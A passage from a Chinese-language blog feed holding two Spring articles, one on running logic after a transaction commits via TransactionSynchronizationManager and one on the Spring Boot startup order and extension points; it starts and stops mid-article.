</span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;);  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码比较简单，其主要是<strong>TransactionSynchronizationManager</strong>的使用。</p><h3 id="3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威"><a href="#3-1、判断是否存在事务？TransactionSynchronizationManager-isSynchronizationActive-方法显神威" class="headerlink" title="3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威"></a>3.1、判断是否存在事务？TransactionSynchronizationManager.isSynchronizationActive() 方法显神威</h3><ul><li>我们先看下这个方法的源码：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// TransactionSynchronizationManager.java类内部的部分代码  </span><br><span class="line">  </span><br><span class="line">private static final ThreadLocal&lt;Set&lt;TransactionSynchronization&gt;&gt; synchronizations =  </span><br><span class="line">   new NamedThreadLocal&lt;&gt;(&quot;Transaction synchronizations&quot;);  </span><br><span class="line">  </span><br><span class="line">public static boolean isSynchronizationActive() &#123;  </span><br><span class="line">    return (synchronizations.get() != null);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">很明显，synchronizations是一个线程变量（ThreadLocal）。那它是在什么时候set进去的呢？这里的话，可以参考下这个方法：org.springframework.transaction.support.TransactionSynchronizationManager\#initSynchronization，其源码如下所示：  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**  </span><br><span class="line">  * Activate transaction synchronization for the current thread.  </span><br><span class="line">  * Called by a transaction manager on transaction begin.  </span><br><span class="line">  * @throws IllegalStateException if synchronization is already active  </span><br><span class="line">  */  </span><br><span class="line">public static void initSynchronization() throws IllegalStateException &#123;  </span><br><span class="line">    if (isSynchronizationActive()) &#123;  </span><br><span class="line">        throw new IllegalStateException(&quot;Cannot activate transaction synchronization - already active&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    logger.trace(&quot;Initializing transaction synchronization&quot;);  </span><br><span class="line">    synchronizations.set(new LinkedHashSet&lt;&gt;());  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由源码中的注释也可以知道，它是在事务管理器开启事务时调用的。换句话说，只要我们的程序执行到带有事务特性的方法时，就会在线程变量中放入一个LinkedHashSet，用来标识当前存在事务。只要isSynchronizationActive返回true，则代表当前有事务。因此，结合这两个方法我们是指能解决我们最开始提出的疑问：<code>要如何判断当前是否存在事务</code></p><h3 id="3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威"><a href="#3-2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager-registerSynchronization-方法显神威" class="headerlink" title="3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威"></a>3.2、如何在事务提交后触发自定义逻辑？TransactionSynchronizationManager.registerSynchronization()方法显神威</h3><ul><li>我们来看下这个方法的源代码：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**  </span><br><span class="line">  * Register a new transaction synchronization for the current thread.  </span><br><span class="line">  * Typically called by resource management code.  </span><br><span class="line">  * &lt;p&gt;Note that synchronizations can implement the  </span><br><span class="line">  * &#123;@link org.springframework.core.Ordered&#125; interface.  </span><br><span class="line">  * They will be executed in an order according to their order value (if any).  </span><br><span class="line">  * @param synchronization the synchronization object to register  </span><br><span class="line">  * @throws IllegalStateException if transaction synchronization is not active  </span><br><span class="line">  * @see org.springframework.core.Ordered  </span><br><span class="line">  */  </span><br><span class="line">public static void registerSynchronization(TransactionSynchronization synchronization)  </span><br><span class="line">    throws IllegalStateException &#123;  </span><br><span class="line">  </span><br><span class="line">    Assert.notNull(synchronization, &quot;TransactionSynchronization must not be null&quot;);  </span><br><span class="line">    if (!isSynchronizationActive()) &#123;  </span><br><span class="line">        throw new IllegalStateException(&quot;Transaction synchronization is not active&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">    synchronizations.get().add(synchronization);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里又使用到了synchronizations线程变量，我们在判断是否存在事务时，就是判断这个线程变量内部是否有值。那我们现在想在<strong>事务提交后触发自定义逻辑</strong>和这个有什么关系呢？</p><p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p><p>我们在上面构建<strong>流水落地api</strong>的伪代码中有向synchronizations内部添加了一个TransactionSynchronizationAdapter，内部并重写了afterCompletion方法，其代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransactionSynchronizationManager.registerSynchronization(new TransactionSynchronizationAdapter() &#123;  </span><br><span class="line">  </span><br><span class="line">    @Override  </span><br><span class="line">    public void afterCompletion(int status) &#123;  </span><br><span class="line">        if (status == TransactionSynchronization.STATUS_COMMITTED) &#123;  </span><br><span class="line">            // 事务提交后，再异步发送消息给kafka  </span><br><span class="line">            executor.submit(() -&gt; &#123;  </span><br><span class="line">                    try &#123;  </span><br><span class="line">                     // 发送消息给kafka  </span><br><span class="line">                    &#125; catch (Exception e) &#123;  </span><br><span class="line">                     // 记录异常信息，发邮件或者进入待处理列表，让开发人员感知异常  </span><br><span class="line">                    &#125;  </span><br><span class="line">            &#125;);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;);  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们结合registerSynchronization的源码来看，其实这段代码主要就是向线程变量内部的LinkedHashSet添加了一个对象而已，但就是这么一个操作，让Spring在事务执行的过程中变得<code>“有事情可做”</code>。这是什么意思呢？是因为Spring在执行事务方法时，对于操作事务的每一个阶段都有一个回调操作，比如：trigger系列的回调</p><p><img src="/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/3.png"><br>invoke系列的回调</p><p><img src="/./2024/06/16/%E9%AB%98%E6%95%88%E6%94%AF%E4%BB%98%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84/4.png"><br>而我们现在的需求就是在事务提交后触发自定义的函数，那就是在invokeAfterCommit和invokeAfterCompletion这两个方法来选了。首先，这两个方法都会拿到所有TransactionSynchronization的集合（其中会包括我们上述添加的TransactionSynchronizationAdapter）。但是要注意一点：invokeAfterCommit只能拿到集合，invokeAfterCompletion除了集合还有一个int类型的参数，而这个int类型的参数其实是当前事务的一种状态。也就是说，如果我们重写了invokeAfterCompletion方法，我们除了能拿到集合外，还能拿到当前事务的状态。因此，此时我们可以根据这个状态来做不同的事情，比如：可以在事务提交时做自定义处理，也可以在事务回滚时做自定义处理等等。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>上面有说到，我们<strong>判断当前是否存在事务、添加钩子函数</strong>都是依赖线程变量的。因此，我们在使用过程中，一定要<strong>避免切换线程</strong>。否则会出现<strong>不生效</strong>的情况。</p>]]></content>
      
      
      <categories>
          
          <category> 架构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 支付系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>一张长图透彻理解SpringBoot启动原理</title>
      
      <link href="/2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/"/>
      <url>/2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>虽然Java程序员大部分工作都是CRUD，但是工作中常用的中间件必须和Spring集成，如果不知道Spring的原理，很难理解这些中间件和框架的原理。</p><h2 id="一张长图透彻解释-Spring启动顺序"><a href="#一张长图透彻解释-Spring启动顺序" class="headerlink" title="一张长图透彻解释 Spring启动顺序"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/1.png"></p><h2 id="测试对Spring启动原理的理解程度"><a href="#测试对Spring启动原理的理解程度" class="headerlink" title="测试对Spring启动原理的理解程度"></a>测试对Spring启动原理的理解程度</h2><p>我举个例子，测试一下，你对Spring启动原理的理解程度。</p><ul><li><p>Rpc框架和Spring的集成问题。Rpc框架何时注册暴露服务，在哪个Spring扩展点注册呢？init-method 中行不行？</p></li><li><p>MQ 消费组和Spring的集成问题。MQ消费者何时开始消费，在哪个Spring扩展点”注册“自己？init-method 中行不行？</p></li><li><p>SpringBoot 集成Tomcat问题。如果出现已开启Http流量，Spring还未启动完成，怎么办？Tomcat何时开启端口，对外服务？</p></li></ul><p>SpringBoot项目常见的流量入口无外乎 Rpc、Http、MQ 三种方式。一名合格的架构师必须精通服务的入口流量何时开启，如何正确开启？最近我遇到的两次线上故障都和Spring启动过程相关。</p><p>故障的具体表现是：Kafka消费组已经开始消费，已开启流量，然而Spring 还未启动完成。因为业务代码中使用的Spring Event事件订阅组件还未启动（订阅者还未注册到Spring），所以处理异常，出了线上故障。根本原因是————项目在错误的时机开启 MQ 流量，然而Spring还未启动完成，导致出现故障。</p><p>正确的做法是：项目在Spring启动完成后开启入口流量，然而我司的Kafka消费组 在Spring <code>init-method bean</code> 实例化阶段就开启了流量，导致故障发生。出现这样的问题，说明项目初期的程序员没有深入理解Spring的启动原理。</p><p>接下来，我再次抛出 11 个问题，说明这个问题————深入理解Spring启动原理的重要性。</p><p><strong>1、</strong> Spring还未完全启动，在<code>PostConstruct</code>中调用<code>getBeanByAnnotation</code>能否获得准确的结果？；<br><strong>2、</strong> 项目应该如何监听Spring的启动就绪事件？；<br><strong>3、</strong> 项目如何监听Spring刷新事件？；<br><strong>4、</strong> Spring就绪事件和刷新事件的执行顺序和区别？；<br><strong>5、</strong> Http流量入口何时启动完成？；<br><strong>6、</strong> 项目中在<code>init-method</code>方法中注册Rpc是否合理？什么是合理的时机？；<br><strong>7、</strong> 项目中在<code>init-method</code>方法中注册MQ消费组是否合理？什么是合理的时机？；<br><strong>8、</strong> <code>PostConstruct</code>中方法依赖<code>ApplicationContextAware</code>拿到<code>ApplicationContext</code>，两者的顺序谁先谁后？是否会出现空指针!；<br><strong>9、</strong> <code>init-method</code>、<code>PostConstruct</code>、<code>afterPropertiesSet</code>三个方法的执行顺序?；<br><strong>10、</strong> 有两个Bean声明了初始化方法A使用<code>PostConstruct</code>注解声明，B使用<code>init-method</code>声明Spring一定先执行A的<code>PostConstruct</code>方法吗？；<br><strong>11、</strong> Spring何时装配Autowire属性，<code>PostConstruct</code>方法中引用Autowired字段什么场景会空指针?；</p><p>精通Spring 启动原理，以上问题则迎刃而解。接下来，大家一起学习Spring的启动原理，看看Spring的扩展点分别在何时执行。</p><h2 id="一起数数-Spring启动过程的扩展点有几个？"><a href="#一起数数-Spring启动过程的扩展点有几个？" class="headerlink" title="一起数数 Spring启动过程的扩展点有几个？"></a>一起数数 Spring启动过程的扩展点有几个？</h2><p>Spring的扩展点极多，这里为了讲清楚启动原理，所以只列举和启动过程有关的扩展点。</p><p><strong>1、</strong> <code>BeanFactoryAware</code>可在Bean中获取<code>BeanFactory</code>实例；<br><strong>2、</strong> <code>ApplicationContextAware</code>可在Bean中获取<code>ApplicationContext</code>实例；<br><strong>3、</strong> <code>BeanNameAware</code>可以在Bean中得到它在IOC容器中的Bean的实例的名字；<br><strong>4、</strong> <code>ApplicationListener</code>可监听<code>ContextRefreshedEvent</code>等；<br><strong>5、</strong> <code>CommandLineRunner</code>整个项目启动完毕后，自动执行；<br>6.  SmartLifecycle#start 在Spring Bean实例化完成后，执行start 方法。<strong>7、</strong> 使用<code>@PostConstruct</code>注解，用于Bean实例初始化；<br><strong>8、</strong> 实现<code>InitializingBean</code>接口，用于Bean实例初始化；<br><strong>9、</strong> xml中声明<code>init-method</code>方法，用于Bean实例初始化；<br><strong>10、</strong> <code>Configuration</code>配置类通过@Bean注解注册Bean到Spring；<br><strong>11、</strong> <code>BeanPostProcessor</code>在Bean的初始化前后，植入扩展点！；<br><strong>12、</strong> <code>BeanFactoryPostProcessor</code>在<code>BeanFactory</code>创建后植入扩展点！；</p><h2 id="通过打印日志学习Spring的执行顺序"><a href="#通过打印日志学习Spring的执行顺序" class="headerlink" title="通过打印日志学习Spring的执行顺序"></a>通过打印日志学习Spring的执行顺序</h2><p>首先我们先通过 代码实验，验证一下以上扩展点的执行顺序。</p><p><strong>1、</strong> 声明<code>TestSpringOrder</code>分别继承以下接口，并且在接口方法实现中，日志打印该接口的名称；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class TestSpringOrder implements  </span><br><span class="line">      ApplicationContextAware,  </span><br><span class="line">      BeanFactoryAware,   </span><br><span class="line">      InitializingBean,   </span><br><span class="line">      SmartLifecycle,   </span><br><span class="line">      BeanNameAware,   </span><br><span class="line">      ApplicationListener&lt;ContextRefreshedEvent&gt;,   </span><br><span class="line">      CommandLineRunner,  </span><br><span class="line">      SmartInitializingSingleton &#123;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@Override  </span><br><span class="line">public void afterPropertiesSet() throws Exception &#123;  </span><br><span class="line">   log.error(&quot;启动顺序:afterPropertiesSet&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">@Override  </span><br><span class="line">public void setApplicationContext(ApplicationContext applicationContext) throws BeansException &#123;  </span><br><span class="line">   log.error(&quot;启动顺序:setApplicationContext&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>2、</strong> <code>TestSpringOrder</code>使用<code>PostConstruct</code>注解初始化，声明<code>init-method</code>方法初始化；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@PostConstruct  </span><br><span class="line">public void postConstruct() &#123;  </span><br><span class="line">   log.error(&quot;启动顺序:post-construct&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">public void initMethod() &#123;  </span><br><span class="line">   log.error(&quot;启动顺序:init-method&quot;);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3、</strong> 新建<code>TestSpringOrder2</code>继承；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class TestSpringOrder3 implements  </span><br><span class="line">         BeanPostProcessor,   </span><br><span class="line">         BeanFactoryPostProcessor &#123;  </span><br><span class="line">   @Override  </span><br><span class="line">   public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class="line">      log.error(&quot;启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class="line">      return bean;  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   @Override  </span><br><span class="line">   public Object postProcessAfterInitialization(Object bean, String beanName) throws BeansException &#123;  </span><br><span class="line">      log.error(&quot;启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:&#123;&#125;&quot;, beanName);  </span><br><span class="line">      return bean;  </span><br><span class="line">   &#125;  </span><br><span class="line">  </span><br><span class="line">   @Override  </span><br><span class="line">   public void postProcessBeanFactory(ConfigurableListableBeanFactory beanFactory) throws BeansException &#123;  </span><br><span class="line">      log.error(&quot;启动顺序:BeanFactoryPostProcessor postProcessBeanFactory &quot;);  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行以上代码后，可以在日志中看到启动顺序！</p><h4 id="实际的执行顺序"><a href="#实际的执行顺序" class="headerlink" title="实际的执行顺序"></a>实际的执行顺序</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2023-11-25 18:10:53,748 [main] ERROR (TestSpringOrder3:37) - 启动顺序:BeanFactoryPostProcessor postProcessBeanFactory   </span><br><span class="line">2023-11-25 18:10:59,299 [main] ERROR (TestSpringOrder:53) - 启动顺序:构造函数 TestSpringOrder  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:127) - 启动顺序: Autowired  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:129) - 启动顺序:setBeanName  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:111) - 启动顺序:setBeanFactory  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:121) - 启动顺序:setApplicationContext  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder3:25) - 启动顺序:BeanPostProcessor postProcessBeforeInitialization beanName:testSpringOrder  </span><br><span class="line">2023-11-25 18:10:59,316 [main] ERROR (TestSpringOrder:63) - 启动顺序:post-construct  </span><br><span class="line">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:116) - 启动顺序:afterPropertiesSet  </span><br><span class="line">2023-11-25 18:10:59,317 [main] ERROR (TestSpringOrder:46) - 启动顺序:init-method  </span><br><span class="line">2023-11-25 18:10:59,320 [main] ERROR (TestSpringOrder3:31) - 启动顺序:BeanPostProcessor postProcessAfterInitialization beanName:testSpringOrder  </span><br><span class="line">2023-11-25 18:17:21,563 [main] ERROR (SpringOrderConfiguartion:21) - 启动顺序: @Bean 注解方法执行  </span><br><span class="line">2023-11-25 18:17:21,668 [main] ERROR (TestSpringOrder:58) - 启动顺序:SmartInitializingSingleton  </span><br><span class="line">2023-11-25 18:17:21,675 [main] ERROR (TestSpringOrder:74) - 启动顺序:start  </span><br><span class="line">2023-11-25 18:17:23,508 [main] ERROR (TestSpringOrder:68) - 启动顺序:ContextRefreshedEvent  </span><br><span class="line">2023-11-25 18:17:23,574 [main] ERROR (TestSpringOrder:79) - 启动顺序:CommandLineRunner  </span><br><span class="line">  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我通过在以上扩展点 添加 debug 断点，调试代码，整理出 Spring启动原理的 长图。过程省略…………</p><h2 id="一张长图透彻解释-Spring启动顺序-1"><a href="#一张长图透彻解释-Spring启动顺序-1" class="headerlink" title="一张长图透彻解释 Spring启动顺序"></a>一张长图透彻解释 Spring启动顺序</h2><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/2.png"></p><h4 id="实例化和初始化的区别"><a href="#实例化和初始化的区别" class="headerlink" title="实例化和初始化的区别"></a>实例化和初始化的区别</h4><p><code>new TestSpringOrder()</code>：new 创建对象实例，即为实例化一个对象；执行该Bean的 <code>init-method</code> 等方法 为初始化一个Bean。注意初始化和实例化的区别。</p><h2 id="Spring-重要扩展点的启动顺序"><a href="#Spring-重要扩展点的启动顺序" class="headerlink" title="Spring 重要扩展点的启动顺序"></a>Spring 重要扩展点的启动顺序</h2><p><strong>1.BeanFactoryPostProcessor</strong></p><p>BeanFactory初始化之后，所有的Bean定义已经被加载，但Bean实例还没被创建（不包括<code>BeanFactoryPostProcessor</code>类型）。Spring IoC容器允许<code>BeanFactoryPostProcessor</code>读取配置元数据，修改bean的定义，Bean的属性值等。</p><p><strong>2.实例化Bean</strong></p><p>Spring 调用java反射API 实例化 Bean。等同于 <code>new TestSpringOrder()</code>;</p><p><strong>3.Autowired 装配依赖</strong></p><p>Autowired是 借助于 <code>AutowiredAnnotationBeanPostProcessor</code> 解析 Bean 的依赖，装配依赖。如果被依赖的Bean还未初始化，则先初始化 被依赖的Bean。在 Bean实例化完成后，Spring将首先装配Bean依赖的属性。</p><p><strong>4.BeanNameAware</strong></p><p><code>setBeanName</code></p><p><strong>5.BeanFactoryAware</strong></p><p><code>setBeanFactory</code></p><p><strong>6.ApplicationContextAware setApplicationContext</strong></p><p>在Bean实例化前，会率先设置Aware接口，例如 <code>BeanNameAware</code> <code>BeanFactoryAware</code> <code>ApplicationContextAware</code> 等</p><p><strong>7.BeanPostProcessor postProcessBeforeInitialization</strong></p><p>如果我想在 bean初始化方法前后要添加一些自己逻辑处理。可以提供 <code>BeanPostProcessor</code>接口实现类，然后注册到Spring IoC容器中。在此接口中，可以创建Bean的代理，甚至替换这个Bean。</p><p><strong>8.PostConstruct 执行</strong></p><p>接下来Spring会依次调用 Bean实例初始化的 三大方法。</p><p><strong>9.InitializingBean</strong></p><p><code>afterPropertiesSet</code></p><p><strong>10.init-method</strong></p><p>方法执行</p><p><strong>11.BeanPostProcessor postProcessAfterInitialization</strong></p><p>在Spring 对Bean的初始化方法执行完成后，执行该方法</p><p><strong>12.其他Bean 实例化和初始化</strong></p><p>Spring 会循环初始化Bean。直至所有的单例Bean都完成初始化</p><p><strong>13.所有单例Bean 初始化完成后</strong></p><p><strong>14.SmartInitializingSingleton Bean实例化后置处理</strong></p><p>该接口的执行时机在 所有的单例Bean执行完成后。例如Spring 事件订阅机制的 <code>EventListener</code>注解，所有的订阅者 都是 在这个位置被注册进 Spring的。而在此之前，Spring Event订阅机制还未初始化完成。所以如果有 MQ、Rpc 入口流量在此之前开启，Spring Event就可能出问题！</p><blockquote><p>所以强烈建议 Http、MQ、Rpc 入口流量在 <code>SmartInitializingSingleton</code> 之后开启流量。</p></blockquote><p>Http、MQ、Rpc 入口流量必须在 <code>SmartInitializingSingleton</code> 之后开启流量。</p><p><strong>15.Spring 提供的扩展点，在所有单例Bean的 EventListener等组件全部启动完成后，即Spring启动完成，则执行 start 方法。在这个位置适合开启入口流量！</strong></p><p>Http、MQ、Rpc 入口流量适合 在 <code>SmartLifecyle</code> 中开启</p><p><strong>16.发布 ContextRefreshedEvent 方法</strong></p><p>该事件会执行多次，在 <code>Spring Refresh</code> 执行完成后，就会发布该事件！</p><p><strong>17.注册和初始化 Spring MVC</strong></p><p>SpringBoot 应用，在父级 Spring启动完成后，会尝试启动 内嵌式 tomcat容器。在此之前，SpringBoot会初始化 SpringMVC 和注册<code>DispatcherServlet</code>到Web容器。</p><p><strong>18.Tomcat&#x2F;Jetty 容器开启端口</strong></p><p>SpringBoot 调用内嵌式容器，会开启并监听端口，此时Http流量就开启了。</p><p><strong>19.应用启动完成后，执行 CommandLineRunner</strong></p><p>SpringBoot 特有的机制，待所有的完全执行完成后，会执行该接口 run方法。值得一提的是，由于此时Http流量已经开启，如果此时进行本地缓存初始化、预热缓存等，稍微有些晚了！在这个间隔期，可能缓存还未就绪！</p><p>所以预热缓存的时机应该发生在 入口流量开启之前，比较合适的机会是在 Bean初始化的阶段。虽然 在Bean初始化时 Spring尚未完成启动，但是调用 Bean预热缓存也是可以的。但是注意：不要在 Bean初始化时 使用 Spring Event，因为它还未完成初始化 。</p><h2 id="回答-关于-Spring-启动原理的若干问题"><a href="#回答-关于-Spring-启动原理的若干问题" class="headerlink" title="回答 关于 Spring 启动原理的若干问题"></a>回答 关于 Spring 启动原理的若干问题</h2><p><strong>1.init-method、PostConstruct、afterPropertiesSet 三个方法的执行顺序。</strong></p><p>回答：<code>PostConstruct</code>，<code>afterPropertiesSet</code>，<code>init-method</code></p><p><strong>2.有两个 Bean声明了初始化方法。A使用 PostConstruct注解声明，B使用 init-method 声明。Spring一定先执行 A 的PostConstruct 方法吗？</strong></p><p>回答：Spring 会循环初始化Bean实例，初始化完成1个Bean，再初始化下一个Bean。Spring并没有使用这种机制启动，即所有的Bean先执行 <code>PostConstruct</code>，再统一执行<code>afterProperfiesSet</code>。</p><p>此外，A、B两个Bean的初始化顺序不确定，谁先谁后不确定。无法保证 A 的<code>PostConstruct</code> 一定先执行。除非使用 Order注解，声明Bean的初始化顺序！</p><p><strong>3.Spring 何时装配Autowire属性，PostConstruct方法中引用 Autowired 字段是否会空指针?</strong></p><p>Autowired装配依赖发生在 <code>PostConstruct</code>之前，不会出现空指针！</p><p><strong>4.PostConstruct 中方法依赖ApplicationContextAware拿到 ApplicationContext，两者的顺序谁先谁后？是否会出现空指针!</strong></p><p><code>ApplicationContextAware</code> 会先执行，不会出现空指针！但是当Autowired没有找到对应的依赖，并且声明了非强制依赖时，该字段会为空，有潜在 空指针风险。</p><p><strong>5.项目应该如何监听 Spring 的启动就绪事件。</strong></p><p>通过<code>SmartLifecyle start</code>方法，监听Spring就绪 。适合在此开启入口流量！</p><p><strong>6.项目如何监听Spring 刷新事件。</strong></p><p>监听<code>Spring Event ContextRefreshedEvent</code></p><p><strong>7.Spring就绪事件和刷新事件的执行顺序和区别。</strong></p><p>Spring就绪事件会先于 刷新事件。两者都可能多次执行，要确保方法的幂等处理，避免重复注册问题</p><p><strong>8.Http 流量入口何时启动完成。</strong></p><p>SpringBoot 最后阶段，启动完成Spring 上下文，才开启Http入口流量，此时 SmartLifecycle#start 已执行。所有单例Bean和SpringEvent等组件都已经就绪！</p><p><strong>9.项目中在 init-method 方法中注册 Rpc是否合理？什么是合理的时机？</strong></p><p>init 开启Rpc流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p><p><strong>10.项目中在 init-method 方法中注册 MQ消费组是否合理？什么是合理的时机？</strong></p><p>init 开启 MQ 流量非常不合理。因为Spring尚未启动完成，包括 Spring Event尚未就绪！</p><p><strong>11.Spring还未完全启动，在 PostConstruct 中调用 getBeanByAnnotation能否获得准确的结果？</strong></p><p>虽然未启动完成，但是Spring执行该<code>getBeanByAnnotation</code>方法时，会率先检查 Bean定义，如果Bean定义对应的 Bean尚未初始化，则初始化这些Bean。所以即便是Spring初始化过程中调用，调用结果是准确的。</p><h2 id="源码级别介绍"><a href="#源码级别介绍" class="headerlink" title="源码级别介绍"></a>源码级别介绍</h2><h4 id="SmartInitializingSingleton-接口的执行位置"><a href="#SmartInitializingSingleton-接口的执行位置" class="headerlink" title="SmartInitializingSingleton 接口的执行位置"></a>SmartInitializingSingleton 接口的执行位置</h4><p>下图代码说明了，Spring在初始化全部 单例Bean以后，会执行 <code>SmartInitializingSingleton</code> 接口。</p><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/3.png"></p><h4 id="Autowired-何时装配Bean的依赖"><a href="#Autowired-何时装配Bean的依赖" class="headerlink" title="Autowired 何时装配Bean的依赖"></a>Autowired 何时装配Bean的依赖</h4><p>在Bean实例化之后，但初始化之前，<code>AutowiredAnnotationBeanPostProcessor</code> 会注入Autowired字段。</p><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/4.png"></p><h4 id="SpringBoot-何时开启Http端口"><a href="#SpringBoot-何时开启Http端口" class="headerlink" title="SpringBoot 何时开启Http端口"></a>SpringBoot 何时开启Http端口</h4><p>下图代码中可以看到，SpringBoot会首先启动 Spring上下文，完成后才启动 嵌入式Web容器，初始化SpringMVC，监听端口</p><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/5.png"></p><h4 id="Spring-初始化Bean的关键代码"><a href="#Spring-初始化Bean的关键代码" class="headerlink" title="Spring 初始化Bean的关键代码"></a>Spring 初始化Bean的关键代码</h4><p>下图我加了注释，Spring初始化Bean的关键代码，全在 这个方法里，感兴趣的可以自行查阅代码 。</p><p>AbstractAutowireCapableBeanFactory#initializeBean</p><p><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/6.png"></p><h4 id="Spring-CommandLineRunner-执行位置"><a href="#Spring-CommandLineRunner-执行位置" class="headerlink" title="Spring CommandLineRunner 执行位置"></a>Spring CommandLineRunner 执行位置</h4><p>Spring Boot外部，当启动完Spring上下文以后，最后才启动 <code>CommandLineRunner</code>。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a><img src="/./2024/06/16/%E4%B8%80%E5%BC%A0%E9%95%BF%E5%9B%BE%E9%80%8F%E5%BD%BB%E7%90%86%E8%A7%A3SpringBoot%E5%90%AF%E5%8A%A8%E5%8E%9F%E7%90%86/7.png"><br>总结</h2><p>SpringBoot 会在Spring完全启动完成后，才开启Http流量。这给了我们启示：应该在Spring启动完成后开启入口流量。Rpc和 MQ流量 也应该如此，所以建议大家 在 <code>SmartLifecype</code> 或者 <code>ContextRefreshedEvent</code> 等位置 注册服务，开启流量。</p><p>例如Spring Cloud Eureka 服务发现组件，就是在 